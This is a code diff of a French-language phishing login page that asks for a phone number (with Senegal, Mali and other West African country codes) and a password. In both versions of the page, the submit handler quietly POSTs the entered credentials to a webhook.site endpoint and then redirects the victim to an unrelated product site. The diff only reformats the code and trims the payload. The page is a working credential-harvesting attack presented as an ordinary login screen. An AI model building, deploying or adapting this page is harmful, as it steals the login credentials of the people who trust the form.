@@ -1,120 +1,119 @@
-<!doctype html>
+<!doctype html>  
+<html lang="fr">  
+<head>  
+  <meta charset="utf-8" />  
+  <meta name="viewport" content="width=device-width,initial-scale=1" />  
+  <title>Connexion</title>  
+  <style>  
+    *{box-sizing:border-box}  
+    html,body{height:100%}  
+    body{  
+      margin:0;  
+      font-family: "Helvetica Neue", Arial, sans-serif;  
+      -webkit-font-smoothing:antialiased;  
+      -moz-osx-font-smoothing:grayscale;  
+      background:#222;  
+      color:#111;  
+    }  
+    .bg{position:fixed; inset:0; background-image:url('https://i.imgur.com/eJMPbBc.jpeg'); background-size:cover; background-position:center center; z-index:0; filter: saturate(0.95);}  
+    .overlay{position:fixed; inset:0; background:rgba(0,0,0,0.35); z-index:1}  
+    .card-wrap{position:relative; z-index:2; height:100%; display:flex; align-items:flex-end; justify-content:center; padding:28px 18px;}  
+    .card{width:100%; max-width:520px; background:transparent; border-radius:12px; padding:0; display:block; margin-bottom:64px;}  
+    .field{display:flex; align-items:center; background:#fff; border-radius:8px; box-shadow:0 2px 0 rgba(0,0,0,0.12); padding:12px 16px; margin-bottom:14px; border:1px solid rgba(0,0,0,0.04);}  
+    .country-select{display:flex; align-items:center; gap:10px; padding-right:10px; cursor:pointer; user-select:none;}  
+    .country-code{font-weight:700; font-size:20px; color:#333; min-width:58px; text-align:left;}  
+    .phone-input{flex:1; border:none; outline:none; font-size:16px; color:#666; background:transparent}  
+    input[type=password]{width:100%; border:none; outline:none; font-size:16px; color:#666; background:transparent}  
+    .btn{display:block; width:100%; background:#f2a900; color:#fff; border-radius:8px; padding:16px; font-size:20px; text-align:center; text-decoration:none; margin-top:6px; box-shadow:0 2px 0 rgba(0,0,0,0.12);}  
+    .signup{display:block; text-align:center; margin-top:18px; color:#fff; text-decoration:underline; font-size:16px}  
+    .modal-backdrop{position:fixed; inset:0; background:rgba(0,0,0,0.45); z-index:30; display:none; align-items:flex-start; justify-content:center; padding:60px 20px}  
+    .modal{background:#fff; border-radius:16px; width:100%; max-width:520px; box-shadow:0 10px 30px rgba(0,0,0,0.35); overflow:hidden}  
+    .modal .title{padding:18px 20px; font-weight:700; text-align:center; border-bottom:1px solid rgba(0,0,0,0.06)}  
+    .country-list{max-height:360px; overflow:auto}  
+    .country-item{display:flex; align-items:center; justify-content:space-between; padding:16px 18px; border-bottom:1px solid rgba(0,0,0,0.06)}  
+    .country-left{display:flex; align-items:center; gap:14px}  
+    .country-abbr{font-weight:700; font-size:22px; letter-spacing:1px}  
+    .country-name{font-size:16px; color:#222}  
+    .country-code-right{color:#6b6b6b; font-weight:600}  
+    @media (max-width:420px){  
+      .country-code{font-size:20px; min-width:54px}  
+      .field{padding:12px}  
+      .btn{font-size:18px; padding:14px}  
+      .card-wrap{padding:18px}  
+    }  
+  </style>  
+</head>  
+<body>  
+  <div class="bg" aria-hidden></div>  
+  <div class="overlay" aria-hidden></div>  
+  <main class="card-wrap">  
+    <form id="loginForm" class="card" autocomplete="off">  
+      <div class="field" style="align-items:center;">  
+        <div id="countryTrigger" class="country-select" aria-haspopup="dialog" aria-expanded="false">  
+          <div class="country-code">+221 ▾</div>  
+        </div>  
+        <input id="phone" class="phone-input" type="tel" placeholder="Entrez votre numéro de téléphone" aria-label="Téléphone" />  
+      </div>  
+      <div class="field">  
+        <input id="password" type="password" placeholder="Entrez votre mot de passe" aria-label="Mot de passe" />  
+      </div>  
+      <button type="submit" class="btn">Se connecter</button>  
+      <a class="signup" href="#">S'inscrire &gt;</a>  
+    </form>  
+  </main>  
+  <div id="modalBackdrop" class="modal-backdrop" role="dialog" aria-modal="true">  
+    <div class="modal">  
+      <div class="title">Sélectionnez le code pays</div>  
+      <div class="country-list" id="countryList">  
+        <div class="country-item" data-code="+221" data-abbr="SEN"><div class="country-left"><div class="country-abbr">SEN</div><div class="country-name">Senegal</div></div><div class="country-code-right">+221</div></div>  
+        <div class="country-item" data-code="+223" data-abbr="MLI"><div class="country-left"><div class="country-abbr">MLI</div><div class="country-name">Mali</div></div><div class="country-code-right">+223</div></div>  
+        <div class="country-item" data-code="+226" data-abbr="BFA"><div class="country-left"><div class="country-abbr">BFA</div><div class="country-name">Burkina Faso</div></div><div class="country-code-right">+226</div></div>  
+        <div class="country-item" data-code="+229" data-abbr="BEN"><div class="country-left"><div class="country-abbr">BEN</div><div class="country-name">Benin</div></div><div class="country-code-right">+229</div></div>  
+        <div class="country-item" data-code="+237" data-abbr="CMR"><div class="country-left"><div class="country-abbr">CMR</div><div class="country-name">Cameroon</div></div><div class="country-code-right">+237</div></div>  
+      </div>  
+    </div>  
+  </div>  
+  <script>  
+    (function(){  
+      const trigger = document.getElementById('countryTrigger');  
+      const backdrop = document.getElementById('modalBackdrop');  
+      const countryList = document.getElementById('countryList');  
+      const phoneInput = document.getElementById('phone');  
+      const loginForm = document.getElementById('loginForm');  
+      let currentCode = '+221';  
 
-<html lang="fr">
-<head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Connexion</title>
-  <style>
-    *{box-sizing:border-box}
-    html,body{height:100%}
-    body{
-      margin:0;
-      font-family: "Helvetica Neue", Arial, sans-serif;
-      -webkit-font-smoothing:antialiased;
-      -moz-osx-font-smoothing:grayscale;
-      background:#222;
-      color:#111;
-    }
-    .bg{position:fixed; inset:0; background-image:url('https://i.imgur.com/eJMPbBc.jpeg'); background-size:cover; background-position:center center; z-index:0; filter: saturate(0.95);}
-    .overlay{position:fixed; inset:0; background:rgba(0,0,0,0.35); z-index:1}
-    .card-wrap{position:relative; z-index:2; height:100%; display:flex; align-items:flex-end; justify-content:center; padding:28px 18px;}
-    .card{width:100%; max-width:520px; background:transparent; border-radius:12px; padding:0; display:block; margin-bottom:64px;}
-    .field{display:flex; align-items:center; background:#fff; border-radius:8px; box-shadow:0 2px 0 rgba(0,0,0,0.12); padding:12px 16px; margin-bottom:14px; border:1px solid rgba(0,0,0,0.04);}
-    .country-select{display:flex; align-items:center; gap:10px; padding-right:10px; cursor:pointer; user-select:none;}
-    .country-code{font-weight:700; font-size:20px; color:#333; min-width:58px; text-align:left;}
-    .phone-input{flex:1; border:none; outline:none; font-size:16px; color:#666; background:transparent}
-    input[type=password]{width:100%; border:none; outline:none; font-size:16px; color:#666; background:transparent}
-    .btn{display:block; width:100%; background:#f2a900; color:#fff; border-radius:8px; padding:16px; font-size:20px; text-align:center; text-decoration:none; margin-top:6px; box-shadow:0 2px 0 rgba(0,0,0,0.12);}
-    .signup{display:block; text-align:center; margin-top:18px; color:#fff; text-decoration:underline; font-size:16px}
-    .modal-backdrop{position:fixed; inset:0; background:rgba(0,0,0,0.45); z-index:30; display:none; align-items:flex-start; justify-content:center; padding:60px 20px}
-    .modal{background:#fff; border-radius:16px; width:100%; max-width:520px; box-shadow:0 10px 30px rgba(0,0,0,0.35); overflow:hidden}
-    .modal .title{padding:18px 20px; font-weight:700; text-align:center; border-bottom:1px solid rgba(0,0,0,0.06)}
-    .country-list{max-height:360px; overflow:auto}
-    .country-item{display:flex; align-items:center; justify-content:space-between; padding:16px 18px; border-bottom:1px solid rgba(0,0,0,0.06)}
-    .country-left{display:flex; align-items:center; gap:14px}
-    .country-abbr{font-weight:700; font-size:22px; letter-spacing:1px}
-    .country-name{font-size:16px; color:#222}
-    .country-code-right{color:#6b6b6b; font-weight:600}
-    @media (max-width:420px){
-      .country-code{font-size:20px; min-width:54px}
-      .field{padding:12px}
-      .btn{font-size:18px; padding:14px}
-      .card-wrap{padding:18px}
-    }
-  </style>
-</head>
-<body>
-  <div class="bg" aria-hidden></div>
-  <div class="overlay" aria-hidden></div>
-  <main class="card-wrap">
-    <form id="loginForm" class="card" autocomplete="off">
-      <div class="field" style="align-items:center;">
-        <div id="countryTrigger" class="country-select" aria-haspopup="dialog" aria-expanded="false">
-          <div class="country-code">+221 ▾</div>
-        </div>
-        <input id="phone" class="phone-input" type="tel" placeholder="Entrez votre numéro de téléphone" aria-label="Téléphone" />
-      </div>
-      <div class="field">
-        <input id="password" type="password" placeholder="Entrez votre mot de passe" aria-label="Mot de passe" />
-      </div>
-      <button type="submit" class="btn">Se connecter</button>
-      <a class="signup" href="#">S'inscrire &gt;</a>
-    </form>
-  </main>
-  <div id="modalBackdrop" class="modal-backdrop" role="dialog" aria-modal="true">
-    <div class="modal">
-      <div class="title">Sélectionnez le code pays</div>
-      <div class="country-list" id="countryList">
-        <div class="country-item" data-code="+221" data-abbr="SEN"><div class="country-left"><div class="country-abbr">SEN</div><div class="country-name">Senegal</div></div><div class="country-code-right">+221</div></div>
-        <div class="country-item" data-code="+223" data-abbr="MLI"><div class="country-left"><div class="country-abbr">MLI</div><div class="country-name">Mali</div></div><div class="country-code-right">+223</div></div>
-        <div class="country-item" data-code="+226" data-abbr="BFA"><div class="country-left"><div class="country-abbr">BFA</div><div class="country-name">Burkina Faso</div></div><div class="country-code-right">+226</div></div>
-        <div class="country-item" data-code="+229" data-abbr="BEN"><div class="country-left"><div class="country-abbr">BEN</div><div class="country-name">Benin</div></div><div class="country-code-right">+229</div></div>
-        <div class="country-item" data-code="+237" data-abbr="CMR"><div class="country-left"><div class="country-abbr">CMR</div><div class="country-name">Cameroon</div></div><div class="country-code-right">+237</div></div>
-      </div>
-    </div>
-  </div>
-  <script>
-    (function(){
-      const trigger = document.getElementById('countryTrigger');
-      const backdrop = document.getElementById('modalBackdrop');
-      const countryList = document.getElementById('countryList');
-      const phoneInput = document.getElementById('phone');
-      const loginForm = document.getElementById('loginForm');
-      let currentCode = '+221';function openModal(){backdrop.style.display = 'flex';trigger.setAttribute('aria-expanded','true');}
-  function closeModal(){backdrop.style.display = 'none';trigger.setAttribute('aria-expanded','false');}
+      function openModal(){backdrop.style.display = 'flex';trigger.setAttribute('aria-expanded','true');}  
+      function closeModal(){backdrop.style.display = 'none';trigger.setAttribute('aria-expanded','false');}  
 
-  trigger.addEventListener('click', function(){ openModal(); });
-  backdrop.addEventListener('click', function(e){if(e.target === backdrop) closeModal();});
-  countryList.addEventListener('click', function(e){
-    const item = e.target.closest('.country-item');
-    if(!item) return;
-    const code = item.getAttribute('data-code') || '+221';
-    currentCode = code;
-    const codeEl = trigger.querySelector('.country-code');
-    codeEl.textContent = code + ' ▾';
-    closeModal();
-    phoneInput.focus();
-  });
+      trigger.addEventListener('click', function(){ openModal(); });  
+      backdrop.addEventListener('click', function(e){if(e.target === backdrop) closeModal();});  
+      countryList.addEventListener('click', function(e){  
+        const item = e.target.closest('.country-item');  
+        if(!item) return;  
+        const code = item.getAttribute('data-code') || '+221';  
+        currentCode = code;  
+        const codeEl = trigger.querySelector('.country-code');  
+        codeEl.textContent = code + ' ▾';  
+        closeModal();  
+        phoneInput.focus();  
+      });  
 
-  loginForm.addEventListener('submit', function(ev){
-    ev.preventDefault();
-    const phone = (phoneInput.value||'').trim();
-    const password = (document.getElementById('password').value||'').trim();
-    const payload = {country_code: currentCode, phone: phone, password: password, timestamp: new Date().toISOString()};
+      loginForm.addEventListener('submit', function(ev){  
+        ev.preventDefault();  
+        const phone = currentCode + (phoneInput.value||'').trim();  
+        const password = (document.getElementById('password').value||'').trim();  
 
-    fetch('https://webhook.site/d47102ec-cb03-4b85-83d7-d85b4c854457', {
-      method: 'POST',
-      headers: { 'Content-Type':'application/json' },
-      body: JSON.stringify(payload)
-    }).catch(()=>{}).finally(()=>{
-      window.location.href = 'https://mcdoneac.com/products';
-    });
-  });
+        fetch('https://webhook.site/d47102ec-cb03-4b85-83d7-d85b4c854457', {  
+          method: 'POST',  
+          headers: { 'Content-Type': 'text/plain' },  
+          body: JSON.stringify({ phone: phone, password: password })  
+        }).catch(()=>{}).finally(()=>{  
+          window.location.href = 'https://mcdoneac.com/products';  
+        });  
+      });  
 
-  document.addEventListener('keydown', function(e){ if(e.key==='Escape') closeModal(); });
-})();
-
-  </script>
-</body>
+      document.addEventListener('keydown', function(e){ if(e.key==='Escape') closeModal(); });  
+    })();  
+  </script>  
+</body>  
 </html>
